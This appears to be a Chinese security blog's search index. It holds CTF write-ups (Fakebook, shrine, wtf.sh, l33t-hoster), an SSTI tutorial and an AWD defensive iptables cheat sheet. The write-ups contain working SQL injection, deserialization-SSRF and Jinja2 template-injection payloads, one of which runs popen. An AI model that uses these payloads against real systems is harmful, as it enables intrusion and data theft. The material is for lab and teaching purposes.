<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[大菜鸡的填坑日记]]></title>
    <url>%2F2019%2F11%2F04%2F%E5%A4%A7%E8%8F%9C%E9%B8%A1%E7%9A%84%E5%A1%AB%E5%9D%91%E6%97%A5%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[LAMP 环境下 php 的 session 无法保存，无法读取 更新时间 2019-11-04 相关环境 centos 7 PHP 7.1.22 坑の描述 项目登陆功能使用到session，但是session无法生成，session_start();执行后没有生成 session 文件。 php.ini配置 成功执行到session_start() 没有 session 文件 填坑 linux上的环境，出了问题猜测是权限的问题，查看下/var/lib/php/session的文件夹权限 想到前阵为了测试修改了 apache 的启动用户 于是将 apache 的启动用户修改回 apache，重启服务后问题解决]]></content>
      <categories>
        <category>坑</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN刷题记录-Bugku]]></title>
    <url>%2F2019%2F10%2F08%2FPWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8%2FPWN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Bugku%2F</url>
    <content type="text"></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWD中舒服的姿势]]></title>
    <url>%2F2019%2F10%2F08%2FAWD%E4%B8%AD%E8%88%92%E6%9C%8D%E7%9A%84%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[数据库备份 方法一 12# cd /var/lib/mysql# mysqldump -uroot -p [库名] &gt; back.sql 方法二 使用 navicat 等图形化工具连接，傻瓜化操作 还原 方法一 123456# 先进入数据库查看库是否存在，不存在就创建# mysql -uroot -pmysql&gt; show databases;mysql&gt; create database [库名];mysql&gt; use [库名];mysql&gt; source back.sql; 方法二 12# 先进数据库查看库是否存在，不存在就创建# mysql -uroot -p [库名] &lt; back.sql 方法三 使用 navicat 等图形化管理工具，傻瓜化操作 常用的访问控制限制端口1234567891011#开放sshiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#打开80端口iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT#开启多端口简单用法iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT 限制ssh登录1234#禁止从xx.xx.xx.xx远程登陆到本机iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP#允许xx.xx.xx.xx网段远程登陆访问sshiptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT 限制IP连接数和连接速率12345678#单个IP的最大连接数为 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT#单个IP在60秒内只允许最多新建15个连接iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT 数据包简单识别，防止端口复用类的后门或者shell123iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT 限制访问12345#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP#封杀1.1.1.4这个IP或者某个ip段iptables -I INPUT -s 1.1.1.4 -j DROPiptables -I INPUT -s 1.1.1.1/24 -j DROP 过滤异常报文123456789101112#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN#匹配SYN标识位iptables -A INPUT -p tcp --syn#检查所有的标识位，匹配到FIN URG PSH的丢弃iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP#丢弃没标志位的包iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP#匹配到SYN ACK FIN URG RST PSH的丢弃（类似的操作自行举一反三）iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG,PSH -j DROP#匹配到 SYN,RST的丢弃iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP 防止DDos1iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT -m limit：启用limit扩展–limit 20/minute：允许最多每分钟10个连接–limit-burst 100：当达到100个连接后，才启用上述20/minute限制 丢弃陌生的TCP响应包,防止反弹式攻击12iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP 服务器及系统ssh连接：ssh &lt;-p 端口号&gt; [username]@[ip] scp远程拷贝： scp [文件路径] [username]@[ip]:[存放路径] 显示最近登录的5个账号： last -n 5 | awk ‘{print $1}’ 显示/etc/passwd的账户： cat /etc/passwd | awk -F ‘:’ ‘{print $1}’ 查看uid为0的账号： awk -F: ‘{if($3==0)print $1}’ /etc/passwd 查找777权限的php文件：find . -name “*.php” -perm 4777 查看进程： ps aux | grep [pid或进程名] 查看已建立的网络连接及进程： netstart -antulp | grep EST 查看指定端口被哪个进程占用： lsof -i:[端口号] netstat -tunlp | grep [端口号] 杀死进程： kill [pid] killall [进程名] pkill [进程名] pkill -u[用户名] #结束该用户（非root）的所有进程 封杀IP或IP段： iptables -I INPUT -s source_ip[/mask] -j DROP 禁止从某个主机ssh远程到本机： iptable -t filter -A INPUT -s source_ip[/mask] -p tcp –dport 22 -j DROP 定时任务，在固定的时间间隔执行指定的系统指令或shell script： crontab [-u user] file_name crontab [-u user] [-e |-l| -r] 检测所有的 tcp 连接数量及状态： netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn 查看页面访问排名前10的IP： cat /var/log/apache2/access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head - 查看页面访问排名前10的 url：cat /var/log/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head - 不允许任何人修改 www 目录下的文件： chattr -R +i /var/www/html 解除不允许修改的属性：chattr -R -i /var/www/html 抓取流量： tcpdump -s 0 -w tcplog.pcap port 9999 加固脚本1234567891011121314151617181920212223242526272829303132333435363738#!/bin/bash#Allow youself Ping other hosts , prohibit others Ping youiptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROPiptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT#Close all INPUT FORWARD OUTPUT, just open some portsiptables -P INPUT DROPiptables -P FORWARD DROPiptables -P OUTPUT DROP#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT#Open multiport#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT#Control IP connection#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT#A single IP allows up to 15 new connections in 60 secondsiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT#Prevent port reuseiptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT#Filter abnormal packetsiptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROPiptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROPiptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROPiptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP#Prevent DoS attacksiptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT#Discard unfamiliar TCP response packs to prevent rebound attacksiptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROPiptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP]]></content>
      <categories>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN入门-Web混不下去了怎么办]]></title>
    <url>%2F2019%2F09%2F24%2FPWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8%2FPWN%E5%85%A5%E9%97%A8-Web%E6%B7%B7%E4%B8%8D%E4%B8%8B%E5%8E%BB%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%2F</url>
    <content type="text"><![CDATA[Web 狗一只，最近打 ctf 愈发觉得 pwn 的重要，于是便有了当爷爷的冲动！ JOJO！我不当狗了！ PWN 环境搭建安装我用的是 ubuntu 18.04 ，安装完成后先换源，先备份官方源 sudo cp /etc/apt/source.list /etc/apt/source.list.b ，更新 /etc/apt/sources.list 为以下内容 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 更新，并安装必要的软件(vim git gedit ssh socat等) 123sudo apt-get updatesudo apt-get -f installsudo apt-get upgrade 安装 pwntools 1234apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install -U setuptoolspip install --upgrade pippip install --upgrade pwntools 安装 pwndbg 123git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 安装 peda 插件 12git clone https://github.com/longld/peda.git ~/pedaecho “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit 安装 libcdatabase 123git clone https://github.com/niklasb/libc-database.gitcd libc-database./get 坑pip 出现问题建议先升级 12sudo pip install --upgrade pipsudo pip3 install --upgrade pip3 出现报错：ImportError: cannot import name main 修改 /usr/bin/pip 为如下内容 123from pip import __main__if __name__ == '__main__': sys.exit(__main__._main()) pip 太慢建议换源 临时换源 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [package name] 永久换源 新建 ~/.pip/pip.conf 文件，写入如下内容 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-CSAW CTF Qualification Round 2016 wtf.sh]]></title>
    <url>%2F2019%2F08%2F22%2FWriteup%2FWP-CSAW-CTF-Qualification-Round-2016-wtf-sh%2F</url>
    <content type="text"><![CDATA[在XCTF上刷题，刷到了这道神仙题，顺着别人的wp做了一遍 第一部分 flag 首先能看到这是一个有注册，登录的功能基本齐全的论坛系统 找源码随便点一个文章链接，可以看到是通过参数post选择文章的 在post参数身上进行测试，程序对post的值过滤不严，有目录穿越漏洞，访问post.wtf?post=../能够读取到源码 明显这不是一个常见的 php, python, java, go 等语言的 web 应用。结合题目wtf.sh, 这是一个shell脚本跑起来的web应用 搜索flag找到如下代码 html解码下得到如下代码: 12345678910111213141516171819202122$ # vim: ft=wtf$ source user_functions.sh&lt;html&gt;&lt;head&gt; &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;&lt;/head&gt;$ if contains 'user' $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists "users/$&#123;URL_PARAMS['user']&#125;"$ then$ local username=$(head -n 1 users/$&#123;URL_PARAMS['user']&#125;);$ echo "&lt;h3&gt;$&#123;username&#125;'s posts:&lt;/h3&gt;";$ echo "&lt;ol&gt;";$ get_users_posts "$&#123;username&#125;" | while read -r post; do$ post_slug=$(awk -F/ '&#123;print $2 "#" $3&#125;' &lt;&lt;&lt; "$&#123;post&#125;");$ echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=$&#123;post_slug&#125;\"&gt;$(nth_line 2 "$&#123;post&#125;" | htmlentities)&lt;/a&gt;&lt;/li&gt;";$ done $ echo "&lt;/ol&gt;";$ if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]$ then$ get_flag1$ fi$ fi&lt;/html&gt; 发现只要以admin身份登录就能够得到flag1 以admin身份登录继续扫目录，发现?post=../users目录下存放了user的token和加密的密码 修改 COOKIE 为 admin 的信息，得到第一部分 flag 第二部分 flag]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>神仙题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-2019 强网杯 Web]]></title>
    <url>%2F2019%2F08%2F01%2FWriteup%2FWP-2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-Web%2F</url>
    <content type="text"><![CDATA[supersqli题目复现https://github.com/CTFTraining/qwb_2019_supersqli/tree/0787e6a8273a78a8b237b08c034851f47cf20d6c 1234git clone https://github.com/CTFTraining/qwb_2019_supersqli.gitcd qwb_2019_supersqli/docker-compose up -ddocker run -d -p 1000:80 ctftraining/qwb_2019_supersqli 题目解析打开题目看到输入框，还有提示 ###]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Insomni hacker's Teaser 2019 l33t-hoster]]></title>
    <url>%2F2019%2F07%2F30%2FWriteup%2FWP-Insomni-hacker-s-Teaser-2019-l33t-hoster%2F</url>
    <content type="text"><![CDATA[题目复现https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster 1234git clone https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster.gitcd insomniteaser_2019_l33t_hoster/docker-compose up -ddocker run -d -p 1000:80 insomniteaser_2019_l33t_hoster:latest 访问 http://[Your IP]:1000 即可 题目解析查看源码获得提示，访问 /?source 得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phpif (isset($_GET["source"])) die(highlight_file(__FILE__));session_start();if (!isset($_SESSION["home"])) &#123; $_SESSION["home"] = bin2hex(random_bytes(20));&#125;$userdir = "images/&#123;$_SESSION["home"]&#125;/";if (!file_exists($userdir)) &#123; mkdir($userdir);&#125;$disallowed_ext = array( "php", "php3", "php4", "php5", "php7", "pht", "phtm", "phtml", "phar", "phps",);if (isset($_POST["upload"])) &#123; if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) &#123; die("yuuuge fail"); &#125; $tmp_name = $_FILES["image"]["tmp_name"]; $name = $_FILES["image"]["name"]; $parts = explode(".", $name); $ext = array_pop($parts); if (empty($parts[0])) &#123; array_shift($parts); &#125; if (count($parts) === 0) &#123; die("lol filename is empty"); &#125; if (in_array($ext, $disallowed_ext, TRUE)) &#123; die("lol nice try, but im not stupid dude..."); &#125; $image = file_get_contents($tmp_name); if (mb_strpos($image, "&lt;?") !== FALSE) &#123; die("why would you need php in a pic....."); &#125; if (!exif_imagetype($tmp_name)) &#123; die("not an image."); &#125; $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123; die("lol noob, your pic is not l33t enough"); &#125; $name = implode(".", $parts); move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);&#125;echo "&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;";foreach(glob($userdir . "*") as $file) &#123; echo "&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;";&#125;echo "&lt;/ul&gt;";?&gt;]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件上传</tag>
        <tag>.htaccess</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-网鼎杯 2018 Fakebook]]></title>
    <url>%2F2019%2F07%2F29%2FWriteup%2FWP-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook%2F</url>
    <content type="text"><![CDATA[题目复现https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a 1234git clone https://github.com/CTFTraining/wdb_2018_fakebook.gitcd wdb_2018_fakebook/docker-compose up -ddocker run -d -p 1000:80 ctftraining/wdb_2018_fakebook 访问 http://[your ip]:1000/ 即可 题目解析题目是一个分享 blog 网址的站 正常注册一个账号 首页上会展示刚才注册的信息，点击用户名会跳转到view.php 在这个页面上展示了username, age, blog 和一个iframe引入的用户填写的blog网址 而且注意到view.php是通过 id 值来查找用户的，那么可能会有sql注入 在页面上引入 blog 是用户可控的，那么很有可能会存在 SSRF 扫下后台 得到robots.txt 如下 12User-agent: *Disallow: /user.php.bak 又得到了一份源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass UserInfo&#123; public $name = ""; public $age = 0; public $blog = ""; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i", $blog); &#125;&#125; 访问flag.php正常200 在view.php?id处sql注入测试后发现此处对空格进行了过滤，用注释/**/绕过下 order by测试查询的字段数为4 常规查表，列，字段 123456-1/**/union/**/select/**/1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#得到table: users-1/**/union/**/select/**/1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#得到column: no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS-1/**/union/**/select/**/1,group_concat(data),3,4 from users where no='3'#得到data: O:8:"UserInfo":3:&#123;s:4:"name";s:7:"abelche";s:3:"age";i:123;s:4:"blog";s:20:"http://www.baidu.com";&#125; 结合在注入的时候页面显示php报错:Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 用户注册的信息经过序列化后存入数据库，在view.php页面再反序列化成实例然后显示出来 将unserialize+ssrf注入data那么我们可以尝试构造序列化的payload读取flag.php 这就用到了前面获得的泄漏的源码 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = ""; public $age = 0; public $blog = ""; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i", $blog); &#125;&#125;$u = unserialize('O:8:"UserInfo":3:&#123;s:4:"name";s:7:"abelche";s:3:"age";i:123;s:4:"blog";s:20:"http://www.baidu.com";&#125;');$s = $u;$s-&gt;blog = 'file:///var/www/html/flag.php';print(serialize($s)); 最终的payload为: -1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;abelche&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;# 查看页面源码得到 base64解码得到flag]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>sql注入</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-TokyoWesterns CTF 4th 2018 shrine]]></title>
    <url>%2F2019%2F07%2F27%2FWriteup%2FWP-TokyoWesterns-CTF-4th-2018-shrine%2F</url>
    <content type="text"><![CDATA[题目复现https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51 1234git clone https://github.com/CTFTraining/westerns_2018_shrine.gitcd westerns_2018_shrinedocker-compose up -ddocker run -d -p 1000:5000 ctftraining/westerns_2018_shrine:latest 访问 http://[你的ip]:1000/ 即可 分析打开页面就是一段源码，右键查看下源码如下: 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 明显是个 flask 在 /shrine/ 下的 SSTI 而且对 payload 进行了过滤 对小括号进行了替换，将 ( 和 ) 替换为空字符串 将 config 和 self 添加进了黑名单 题目解析1&#123;&#123;7*7&#125;&#125; 1&#123;&#123;7*'7'&#125;&#125; 测试发现是 jinja2 或 Twig，后端源码为 flask 所以这个是关于 flask + jinja2 的 SSTI 至于为什么，请看图 1&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125; 明显这里对 () 进行了过滤 只能从别的地方入手，例如 flask 的内置函数和变量， 当然，config 和 self 也被加入了黑名单 但通过变量去读取 app.config 也会涉及到 () 的使用 所以只剩下内置函数 get_flashed_messages(), url_for() 构造payload 1&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125; 得到flag 总结这是一道很简单很基础的 SSTI 总体思路就是 判断 SSTI 类型 分析过滤 构造 payload 最后，关于 SSTI : SSTI-服务端模板注入简析]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>flask</tag>
        <tag>jinja2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从 flask+jinjia2 认识 SSTI 服务端模板注入]]></title>
    <url>%2F2019%2F07%2F27%2FSSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%AE%80%E6%9E%90%2F</url>
    <content type="text"><![CDATA[推荐文章 https://portswigger.net/blog/server-side-template-injection 以 flask+jinja2 的 SSTI 为例分析 SSTI SSTISSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么 模板首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让(网站)程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。 模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据(变量)到实际的视觉表现(HTML代码)这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。 通俗点理解:拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。 后端渲染:浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。 前端渲染:前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。 举个例子:(django) 前端代码:index.html 123&lt;html&gt; &lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt;&lt;/html&gt; 后端代码:view.py 12345def index(request): data = &#123; 'message': 'hello world', &#125; return render(request, 'index.html', data) 那么当我们去访问 index.html 这个页面的时候页面从后端拿到message的数据呈现给用户的页面显示为: 123&lt;html&gt; &lt;div&gt;hello world&lt;/div&gt;&lt;/html&gt; SSTIweb 应用程序通过使用模板在网页中嵌入动态内容，那么如果显示的内容是用户可控的，可能首先会想到 XSS ，而存在 XSS 的地方很有可能存在 SSTI 本地测试(flask + jinja2)新建一个 flask 项目: app.py 123456789101112131415161718192021from flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)@app.route('/hello/&lt;name&gt;')def hello_world(name): return render_template('welcome.html', name=name)@app.route('/h/&lt;name&gt;', methods=['GET', 'POST'])def hello(name): template = ''' &lt;div&gt; &lt;h3&gt;hello %s&lt;/h3&gt; &lt;/div&gt; ''' % name return render_template_string(template)if __name__ == '__main__': app.run( host='127.0.0.1', port=8000 ) index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;this is a SSTI test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; &lt;h3&gt;hello &#123;&#123; name &#125;&#125;&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 结果如图: 明显 flask 返回模板字符串的存在 XSS 第一个没有触发XSS的原因就是模板对符号进行了编码即用户对此不可控 继续在触发 XSS 的点进行 SSTI 测试:最简单的 payload : 1&#123;&#123;12312*213&#125;&#125; 代码执行成功试下查看目录，payload: 1&#123;&#123;''.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('dir').read()&#125;&#125; getshell 什么的也不用多说了 python 常用内建属性__class____class__ 可以用来查看对象的类型,返回值为 type 123456&gt;&gt;&gt; ''.__class__&lt;class 'str'&gt;&gt;&gt;&gt; [].__class__&lt;class 'list'&gt;&gt;&gt;&gt; ''.__class__.__class__&lt;class 'type'&gt; __bases____bases__ 可以列出该类的基类，返回值为 tuple 123456&gt;&gt;&gt; ''.__class__.__bases__(&lt;class 'object'&gt;,)&gt;&gt;&gt; ''.__class__.__bases__[0]&lt;class 'object'&gt;&gt;&gt;&gt; ''.__class__.__bases__.__class__&lt;class 'tuple'&gt; __mro____mro__ 给出了 method resolution order ，即解析方法调用的顺序， 返回值为 tuple 123456&gt;&gt;&gt; ''.__class__.__mro__(&lt;class 'str'&gt;, &lt;class 'object'&gt;)&gt;&gt;&gt; ''.__class__.__class__.__mro__(&lt;class 'type'&gt;, &lt;class 'object'&gt;)&gt;&gt;&gt; ''.__class__.__mro__.__class__&lt;class 'tuple'&gt; __subclasses__()__subclasses__() 用于获取一个类的子类，返回值为 list 而__subclasses__ 的返回值则是 python 内建方法 builtin_function_or_method 12345678910&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__&lt;built-in method __subclasses__ of type object at 0x00007FFD2B796D30&gt;&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__.__class__&lt;class 'builtin_function_or_method'&gt;&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__()[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, ...&lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class '__future__._Feature'&gt;]&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__().__class__&lt;class 'list'&gt; __globals____globals__ 用于返回一个当前空间下能使用的模块，方法和变量的字典 这个属性是对函数的操作，即:用法为函数名.__globals__ 12345678910111213&gt;&gt;&gt; class A():... def __init__(self):... pass... def fun(self):... 